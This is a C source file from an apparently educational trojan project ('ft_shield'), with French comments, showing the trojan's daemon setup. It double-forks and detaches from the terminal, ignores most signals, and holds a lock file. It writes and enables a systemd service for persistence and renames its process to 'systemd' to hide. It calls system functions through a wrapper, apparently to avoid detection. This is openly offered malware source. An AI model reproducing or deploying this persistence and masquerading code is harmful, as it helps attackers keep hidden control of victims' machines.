#include "trojan.h"

// man7 daemon

void close_fds() {
    if (sc(SYS_close_range, 3, ~0U, 0) == -1) {
        perror("close_range");
        exit(EXIT_FAILURE);
    }
}

void set_persistance() {
    const char *path = "/etc/systemd/system/ft_shield.service";
    int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
    if (fd < 0) {
        perror("open : ");
        return ;
    }
    write(fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));

    system("systemctl daemon-reexec");
    system("systemctl enable /etc/systemd/system/ft_shield.service");
}

void reset_signals() {
    for (int sig = SIGHUP; sig < _NSIG; sig++)
        signal(sig, SIG_DFL);

    sigset_t empty;
    sigemptyset(&empty);
    sigprocmask(SIG_SETMASK, &empty, NULL);
    for (int sig = 1; sig < _NSIG; sig++) { // Ignorer certains signaux
        if (sig != SIGKILL && sig != SIGSTOP && sig != SIGPIPE)
            signal(sig, SIG_IGN);
    }
}

void handle_lock(int mod) {
    const char *lock_file = "/tmp/ft_shield.lock";
    int fd = sc(SYS_open, lock_file, O_CREAT | O_RDWR, 0644);

    if (mod == LOCK) {
        if (sc(SYS_flock, fd, LOCK_EX | LOCK_NB) == -1) {
            sc(SYS_close, fd);
            exit(EXIT_FAILURE);
        }
    } else {
        sc(SYS_flock, fd, LOCK_UN);
        sc(SYS_close, fd);
        sc(SYS_unlink, lock_file);
    }
}

void create_daemon() {
    pid_t pid = sc(SYS_fork);
    
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS); // Quitter le parent
    // nouvelle session
    if (sc(SYS_setsid) < 0)
        exit(EXIT_FAILURE);

    // deuxième fork pour s'assurer que le démon ne peut jamais réaquérir un terminal
    pid = sc(SYS_fork);
    if (pid < 0)
        exit(EXIT_FAILURE);
    if (pid > 0)
        exit(EXIT_SUCCESS);
    close_fds();
    reset_signals();
    set_persistance();
    handle_lock(LOCK);
    sc(SYS_prctl, PR_SET_NAME, "systemd\0", NULL, NULL, NULL);
    sc(SYS_umask, 0);
    sc(SYS_chdir, "/");
    int fd = sc(SYS_open, "/dev/null");
    if (fd < 0)
        exit(EXIT_FAILURE);
        // int log_fd = open("/tmp/daemon.log", O_WRONLY | O_CREAT | O_APPEND, 0644);
    // redirection des flux standards vers /dev/null
    sc(SYS_dup2, fd, STDIN_FILENO);
    sc(SYS_dup2, fd, STDOUT_FILENO);
    sc(SYS_dup2, fd, STDERR_FILENO);

}
